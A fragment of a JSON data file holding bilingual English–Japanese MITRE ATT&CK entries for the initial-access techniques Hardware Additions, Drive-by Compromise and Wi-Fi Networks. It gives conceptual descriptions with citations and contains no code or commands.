                "description_eng": "Adversaries may physically introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.\n\nWhile public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access points to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)",
                "description_jp": "攻撃者は、アクセスを取得するためのベクトルとして、コンピュータアクセサリ、ネットワークハードウェア、またはその他のコンピューティングデバイスをシステムまたはネットワークに物理的に導入する可能性があります。リムーバブルストレージを介したペイロードの接続と配布（つまり、[リムーバブルメディアによる複製](https://attack.mitre.org/techniques/T1091)）だけでなく、より堅牢なハードウェア追加を使用して、システムに新しい機能や特徴を導入し、その後悪用することができます。\n\n脅威アクターによる使用の公的文献は少ないですが、多くのレッドチーム/侵入テスターは初期アクセスのためにハードウェア追加を利用しています。商用およびオープンソース製品は、パッシブネットワークタッピング、ネットワークトラフィック変更（つまり、[中間者攻撃](https://attack.mitre.org/techniques/T1557)）、キーストロークインジェクション、DMA経由のカーネルメモリ読み取り、既存ネットワークへの新しいワイヤレスアクセスポイントの追加などの機能で利用できます。(引用: Ossmann Star Feb 2011)(引用: Aleks Weapons Nov 2015)(引用: Frisk DMA August 2016)(引用: McMillan Pwn March 2012)",
                "subtechniques": []
            },
            {
                "id": "T1189",
                "name_eng": "Drive-by Compromise",
                "name_jp": "ドライブバイコンプロマイズ",
                "description_eng": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:\n\n* A legitimate website is compromised, allowing adversaries to inject malicious code\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n* Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)\n\nBrowser push notifications may also be abused by adversaries and leveraged for malicious code injection via [User Execution](https://attack.mitre.org/techniques/T1204). By clicking \"allow\" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.(Citation: Push notifications - viruspositive)(Citation: push notification -mcafee)(Citation: push notifications - malwarebytes)\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",
                "description_jp": "攻撃者は、通常のブラウジング中にユーザーがウェブサイトにアクセスすることでシステムへのアクセスを取得する可能性があります。ブラウザにエクスプロイトコードを配信する方法は複数存在します（つまり、[ドライブバイターゲット](https://attack.mitre.org/techniques/T1608/004)）。例：\n\n* 正当なウェブサイトが侵害され、攻撃者が悪意のあるコードを注入できるようになる\n* 公開書き込み可能なクラウドストレージバケットから正当なウェブサイトに提供されるスクリプトファイルが攻撃者によって変更される\n* 悪意のある広告が購入され、正当な広告プロバイダーを介して配信される（つまり、[マルバタイジング](https://attack.mitre.org/techniques/T1583/008)）\n* ユーザーが制御可能なコンテンツを許可する組み込みウェブアプリケーションインターフェイスが悪意のあるスクリプトやiFrameの挿入に利用される（例：クロスサイトスクリプティング）\n\nブラウザのプッシュ通知も、[ユーザー実行](https://attack.mitre.org/techniques/T1204)を介した悪意のあるコードインジェクションに攻撃者によって悪用される可能性があります。ブラウザのプッシュ通知で「許可」をクリックすることにより、ユーザーはウェブサイトにブラウザ上でJavaScriptコードを実行する権限を与えている可能性があります。(引用: Push notifications - viruspositive)(引用: push notification -mcafee)(引用: push notifications - malwarebytes)\n\n多くの場合、敵対者が使用するウェブサイトは、政府、特定の業界、または特定の地域など、特定のコミュニティが訪問するものであり、その目的は共通の関心に基づいて特定のユーザーまたはユーザーのセットを侵害することです。この種の標的型キャンペーンは、しばしば戦略的ウェブ侵害または水飲み場型攻撃と呼ばれます。これが発生した既知の例がいくつかあります。(引用: Shadowserver Strategic Web Compromise)\n\n典型的なドライブバイコンプロマイズのプロセス：\n\n1.ユーザーは、攻撃者が制御するコンテンツをホストするために使用されるウェブサイトにアクセスします。\n2.スクリプトが自動的に実行され、通常、潜在的に脆弱なバージョンのブラウザとプラグインを検索します。ユーザーは、スクリプト、通知、またはアクティブなウェブサイトコンポーネントを有効にし、警告ダイアログボックスを無視することにより、このプロセスを支援する必要がある場合があります。\n3.脆弱なバージョンが見つかると、エクスプロイトコードがブラウザに配信されます。\n4.悪用が成功した場合、他の保護が導入されていない限り、攻撃者はユーザーのシステムでコード実行を取得します。場合によっては、最初のスキャンの後にウェブサイトへの2回目の訪問が必要になることがあります。\n\n[公開されているアプリケーションの悪用](https://attack.mitre.org/techniques/T1190)とは異なり、このテクニックの焦点は、ウェブサイトにアクセスしたときにクライアントエンドポイント上のソフトウェアを悪用することです。これにより、DMZ内にある可能性のある外部システムではなく、内部ネットワーク上のシステムへのアクセスが一般的に攻撃者に与えられます。",
                "subtechniques": []
            },
            {
                "id": "T1669",
                "name_eng": "Wi-Fi Networks",
                "name_jp": "Wi-Fiネットワーク",
                "description_eng": "Adversaries may gain initial access to target systems by connecting to wireless networks. They may accomplish this by exploiting open Wi-Fi networks used by target devices or by accessing secured Wi-Fi networks — requiring [Valid Accounts](https://attack.mitre.org/techniques/T1078) — belonging to a target organization.(Citation: DOJ GRU Charges 2018)(Citation: Nearest Neighbor Volexity) Establishing a connection to a Wi-Fi access point requires a certain level of proximity to both discover and maintain a stable network connection. \n\nAdversaries may establish a wireless connection through various methods, such as by physically positioning themselves near a Wi-Fi network to conduct close access operations. To bypass the need for physical proximity, adversaries may attempt to remotely compromise nearby third-party systems that have both wired and wireless network connections available (i.e., dual-homed systems). These third-party compromised devices can then serve as a bridge to connect to a target’s Wi-Fi network.(Citation: Nearest Neighbor Volexity)\n\nOnce an initial wireless connection is achieved, adversaries may leverage this access for follow-on activities in the victim network or further targeting of specific devices on the network. Adversaries may perform [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) activities for [Credential Access](https://attack.mitre.org/tactics/TA0006) or [Discovery](https://attack.mitre.org/tactics/TA0007).",
                "description_jp": "攻撃者は、ワイヤレスネットワークに接続することにより、ターゲットシステムへの初期アクセスを取得する可能性があります。これは、ターゲットデバイスが使用するオープンWi-Fiネットワークを悪用するか、ターゲット組織に属するセキュリティで保護されたWi-Fiネットワーク（[有効なアカウント](https://attack.mitre.org/techniques/T1078)が必要）にアクセスすることによって達成される場合があります。(引用: DOJ GRU Charges 2018)(引用: Nearest Neighbor Volexity) Wi-Fiアクセスポイントへの接続を確立するには、安定したネットワーク接続を発見して維持するためのある程度の近接性が必要です。\n\n敵対者は、近接アクセス操作を行うためにWi-Fiネットワークの近くに物理的に位置するなど、様々な方法で無線接続を確立する可能性があります。物理的な近接性の必要性を回避するために、敵対者は有線と無線の両方のネットワーク接続が利用可能な近くのサードパーティシステムをリモートで侵害しようとする可能性があります（すなわち、デュアルホームシステム）。これらのサードパーティの侵害されたデバイスは、その後、ターゲットのWi-Fiネットワークに接続するためのブリッジとして機能することができます。(引用：Nearest Neighbor Volexity)\n\n初期の無線接続が確立されると、敵対者はこのアクセスを利用して、被害者ネットワーク内での追跡活動や、ネットワーク上の特定のデバイスのさらなる標的化を行う可能性がある。敵対者は、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)または[発見](https://attack.mitre.org/tactics/TA0007)のために、[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)または[中間者攻撃](https://attack.mitre.org/techniques/T1557)活動を実行する可能性がある。",
                "subtechniques": []
            }
        ]
    }
]